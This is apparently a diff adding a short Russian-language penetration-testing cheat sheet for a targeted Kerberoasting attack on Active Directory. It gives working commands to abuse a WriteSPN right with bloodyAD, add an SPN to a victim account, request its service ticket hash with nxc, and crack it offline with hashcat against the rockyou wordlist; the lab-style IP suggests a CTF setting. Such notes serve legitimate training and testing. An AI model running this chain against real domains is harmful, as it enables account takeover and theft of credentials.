@@ -1,0 +1,13 @@
+Если через bloodhound видим связь  WriteSPN
+
+добавляем SPN к пользователю на которого нацелена атака
+bloodyAD -u user -p 'password!' --host 10.10.11.72 set object USER servicePrincipalName -v 'http/pwned'
+
+
+теперь  kerberoasting
+sudo ntpdate ip_DC (синхронизировать время с контроллером домена)
+nxc ldap dc01.local -u user -p 'password!' --kerberoasting -
+
+получаем хэш в файл local.krbroast
+перебираем хэш 
+hashcat -m 13100 local.krbroast /usr/share/wordlist/rockyou.txt
